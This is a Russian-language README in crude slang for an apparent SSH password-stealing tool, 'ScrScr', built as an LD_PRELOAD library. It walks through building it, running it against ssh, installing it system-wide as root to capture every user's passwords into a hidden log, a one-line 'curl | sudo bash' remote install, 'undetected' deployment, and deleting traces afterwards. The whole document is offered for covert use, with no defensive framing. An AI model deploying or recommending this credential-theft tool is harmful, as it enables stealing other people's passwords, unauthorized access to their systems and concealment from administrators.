# КАК ЮЗАТЬ ЭТУ ПРОГУ НОРМАЛЬНО

## САМЫЙ ПРОСТОЙ ЗАПУСК (ДЛЯ СОВСЕМ ЧАЙНИКОВ)
```
# 1. Скачиваем из гитхаба
git clone https://github.com/Personaz1/ScrScr.git

# 2. Заходим в папку
cd ScrScr

# 3. Собираем
make

# 4. Запускаем с перехватом пароля
LD_PRELOAD=./libssh_inject.so ssh твой_юзер@твой_сервер
```

Все! После 4-го шага - готово! Пароли будут сохраняться в /tmp/ssh_inj.dbg

## УСТАНОВКА НА ГЛОБАЛЬНОМ УРОВНЕ (ПАЛИМ ВСЕХ ЮЗЕРОВ)
```
# Скачиваем из гитхаба
git clone https://github.com/Personaz1/ScrScr.git
cd ScrScr

# Ставим на систему (нужны права рута)
sudo ./root_install.sh
```

После этого перехватчик установлен системно и работает для ВСЕХ ЮЗЕРОВ включая рута. Все пароли сливаются в файл `/var/log/.ssh_passwd.log`.

## БЫСТРАЯ УДАЛЕННАЯ УСТАНОВКА (ОДНОЙ КОМАНДОЙ)
```
# Для установки на удаленный сервер
curl -s https://raw.githubusercontent.com/Personaz1/ScrScr/main/root_quick_install.sh | sudo bash
```

## ЧЕ ЭТО ТАКОЕ ВАЩЕ?
Короче, эта прога палит пароли от SSH. Когда юзер коннектится куда-то по SSH и вводит пасс, мы его тихо сливаем себе. Работает как с клиентской стороны (перехватывает пароли когда ты коннектишься куда-то), так и с серверной (палит пароли когда кто-то коннектится к тебе). Четко, ровно, без палева.

## КАК СОБРАТЬ
Просто въебашь:
```
make
```
И все, библиотека собралась в libssh_inject.so. Если с первого раза не получилось, сначала сделай:
```
make clean
```

## БЫСТРЫЙ ТЕСТ (ДЛЯ СВОИХ)
```
# Создаем лог-файл
touch /tmp/ssh_inj.dbg
chmod 666 /tmp/ssh_inj.dbg

# Запускаем тест
LD_PRELOAD=./libssh_inject.so ssh любой_сервер
```

## СТАВИМ НА МАШИНУ (БЕЗ ПАЛЕВА)
```
# Собираем
make

# Создаем куда писать пароли
touch /tmp/ssh_inj.dbg
chmod 666 /tmp/ssh_inj.dbg

# Или просто запусти скрипт установки
./install.sh
```

## ГДЕ ИСКАТЬ ПАРОЛИ
Все палево сливается в файлы:
```
# Для обычного режима:
/tmp/ssh_inj.dbg

# Для режима рут (системная установка):
/var/log/.ssh_passwd.log

# Для серверного режима:
/tmp/sshd_inj.dbg
```

## КАК УДАЛИТЬ СЛЕДЫ
Чтобы все почистить:
```
# Удаляем лог-файлы
rm -f /tmp/ssh_inj.dbg
rm -f /tmp/sshd_inj.dbg

# Если была системная установка:
sudo ./root_uninstall.sh

# Если была юзерская установка:
./uninstall.sh

# Чистим скомпилированные файлы
make clean
```
